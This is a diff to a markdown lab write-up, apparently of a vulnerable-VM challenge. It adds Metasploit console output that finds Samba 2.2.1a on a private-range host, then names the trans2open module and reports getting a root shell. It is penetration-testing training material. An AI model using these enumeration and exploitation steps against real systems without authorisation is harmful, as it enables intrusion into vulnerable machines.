@@ -92,35 +92,135 @@ As per the results obtained, these are the most exploitable services we can use 
 
 First I go to the web page as http service is running but we get nothing much and it gives us a default test page.
 
-also I tried to find the hidden directories using dirb directory buster but again no luck!
+![2](https://github.com/user-attachments/assets/1faaf1d5-03f5-449a-8fa4-36130266066d)
 
 
-So, I go back to the nmap scan results and look for other services and their versions. Here I get a good candidate to exploit and that is the smb service, but still there is no version available, so now its the time to use the swiss knife that is our beloved “Metasploit”.
+So, I go back to the nmap scan results and look for other services and their versions. I've found a promising target for exploitation: the SMB service. Since the version is not disclosed, it's time to use our trusted tool, Metasploit, to proceed.
 
-To initiate the msfdb(for first time usage) and fire up the metasploit use the below commands -
+``` msfconsole ```
 
-msfdb init
+Here I searched for the “scanner smb” auxiliary module to scan the target and get the running version of the smb service.
 
-msfconsole
-Here I searched for the “smb_version” auxiliary module to scan the target and get the running version of the smb service.
+```console
+┌──(kali㉿kali)-[~]
+└─$ sudo msfconsole   
+                                                  
 
-search smb_version
+      .:okOOOkdc'           'cdkOOOko:.                                                                                                                    
+    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.                                                                                                                  
+   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:                                                                                                                 
+  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'                                                                                                                
+  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo                                                                                                                
+  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx                                                                                                                
+  lOOOOOOOO.         ;d;         ,OOOOOOOOl                                                                                                                
+  .OOOOOOOO.   .;           ;    ,OOOOOOOO.                                                                                                                
+   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc                                                                                                                 
+    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo                                                                                                                  
+     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl                                                                                                                   
+      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;                                                                                                                    
+       .dOOo   .OOOOocccxOOOO.   xOOd.                                                                                                                     
+         ,kOl  .OOOOOOOOOOOOO. .dOk,                                                                                                                       
+           :kk;.OOOOOOOOOOOOO.cOk:                                                                                                                         
+             ;kOOOOOOOOOOOOOOOk:                                                                                                                           
+               ,xOOOOOOOOOOOx,                                                                                                                             
+                 .lOOOOOOOl.                                                                                                                               
+                    ,dOd,                                                                                                                                  
+                      .                                                                                                                                    
 
-metasploit
-This returned with available auxiliary scanner module and then I set the target ip to be scanned and run the module-
+       =[ metasploit v6.3.27-dev                          ]
++ -- --=[ 2335 exploits - 1220 auxiliary - 413 post       ]
++ -- --=[ 1385 payloads - 46 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
 
-show options 
-set rhsosts <target ip>
-run
+Metasploit tip: Save the current environment with the 
+save command, future console restarts will use this 
+environment again
+Metasploit Documentation: https://docs.metasploit.com/
 
-Metasploit results
-it will provide me the version of the Samba service that was — “Samba 2.2.1a”
+msf6 > search scanner smb
 
-Now we have got the version, it’s time search for the available exploit to attack on this. For this, I moved to Google and simply search for the exploit for the samba version. I got the result from rapid 7 link with name “trans2open”.
+Matching Modules
+================
+
+   #   Name                                                            Disclosure Date  Rank    Check  Description
+   -   ----                                                            ---------------  ----    -----  -----------
+   0   auxiliary/scanner/http/citrix_dir_traversal                     2019-12-17       normal  No     Citrix ADC (NetScaler) Directory Traversal Scanner
+   1   auxiliary/scanner/smb/impacket/dcomexec                         2018-03-19       normal  No     DCOM Exec
+   2   auxiliary/scanner/smb/impacket/secretsdump                                       normal  No     DCOM Exec
+   3   auxiliary/scanner/dcerpc/dfscoerce                                               normal  No     DFSCoerce
+   4   auxiliary/scanner/smb/smb_ms17_010                                               normal  No     MS17-010 SMB RCE Detection
+   5   auxiliary/scanner/smb/psexec_loggedin_users                                      normal  No     Microsoft Windows Authenticated Logged In Users Enumeration
+   6   auxiliary/scanner/dcerpc/petitpotam                                              normal  No     PetitPotam
+   7   auxiliary/scanner/sap/sap_smb_relay                                              normal  No     SAP SMB Relay Abuse
+   8   auxiliary/scanner/sap/sap_soap_rfc_eps_get_directory_listing                     normal  No     SAP SOAP RFC EPS_GET_DIRECTORY_LISTING Directories Information Disclosure
+   9   auxiliary/scanner/sap/sap_soap_rfc_pfl_check_os_file_existence                   normal  No     SAP SOAP RFC PFL_CHECK_OS_FILE_EXISTENCE File Existence Check
+   10  auxiliary/scanner/sap/sap_soap_rfc_rzl_read_dir                                  normal  No     SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing
+   11  auxiliary/scanner/smb/smb_enumusers_domain                                       normal  No     SMB Domain User Enumeration
+   12  auxiliary/scanner/smb/smb_enum_gpp                                               normal  No     SMB Group Policy Preference Saved Passwords Enumeration
+   13  auxiliary/scanner/smb/smb_login                                                  normal  No     SMB Login Check Scanner
+   14  auxiliary/scanner/smb/smb_lookupsid                                              normal  No     SMB SID User Enumeration (LookupSid)
+   15  auxiliary/admin/smb/check_dir_file                                               normal  No     SMB Scanner Check File/Directory Utility
+   16  auxiliary/scanner/smb/pipe_auditor                                               normal  No     SMB Session Pipe Auditor
+   17  auxiliary/scanner/smb/pipe_dcerpc_auditor                                        normal  No     SMB Session Pipe DCERPC Auditor
+   18  auxiliary/scanner/smb/smb_enumshares                                             normal  No     SMB Share Enumeration
+   19  auxiliary/scanner/smb/smb_enumusers                                              normal  No     SMB User Enumeration (SAM EnumUsers)
+   20  auxiliary/scanner/smb/smb_version                                                normal  No     SMB Version Detection
+   21  auxiliary/scanner/snmp/snmp_enumshares                                           normal  No     SNMP Windows SMB Share Enumeration
+   22  auxiliary/scanner/smb/smb_uninit_cred                                            normal  Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
+   23  auxiliary/scanner/smb/impacket/wmiexec                          2018-03-19       normal  No     WMI Exec
 
 
-trans2open
-Step 3: Exploitation
+Interact with a module by name or index. For example info 23, use 23 or use auxiliary/scanner/smb/impacket/wmiexec
+
+```
+
+Now I have found the scanner for the smb version which is module 20 for the list and then use it. Set the `RHOSTS  ` with the target IP `192.168.78.131` and then `run` the module.
+
+```console
+msf6 > use auxiliary/scanner/smb/smb_version
+msf6 auxiliary(scanner/smb/smb_version) > show options
+                                                                                                                                                           
+Module options (auxiliary/scanner/smb/smb_version):                                                                                                        
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   THREADS  1                yes       The number of concurrent threads (max one per host)
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.78.131
+RHOSTS => 192.168.78.131
+msf6 auxiliary(scanner/smb/smb_version) > show options
+
+Module options (auxiliary/scanner/smb/smb_version):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS   192.168.78.131   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   THREADS  1                yes       The number of concurrent threads (max one per host)
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/smb/smb_version) > run
+
+[*] 192.168.78.131:139    - SMB Detected (versions:) (preferred dialect:) (signatures:optional)
+[*] 192.168.78.131:139    -   Host could not be identified: Unix (Samba 2.2.1a)
+[*] 192.168.78.131:       - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+```
+
+This shows the version of the Samba service that was — “Samba 2.2.1a”
+
+Now we have got the version, it’s time search for the available exploit to attack on this. For this, I moved to Google and simply search for the exploit for the samba version. I got the result from rapid 7 link with name `trans2open`.
+
+![3](https://github.com/user-attachments/assets/31b81922-194b-4aea-8eb3-bac84cf11743)
+
+### Exploitation:
+As the exploit is available on `Rapid7` which means that its module will surely be available on `metasploit`
 Now I moved back to metasploit and search for the available exploit for “trans2open”.
 
 search trans2open
@@ -140,9 +240,6 @@ Then simply run the exploit and voilla!, I get the root shell.
 
 root shell
 That’s it for this challenge we have to gain the root access. This can be done in numerous ways, this is one of them.
-
-
-### Exploitation:
 
 ---
 ## Happy Hacking ;)
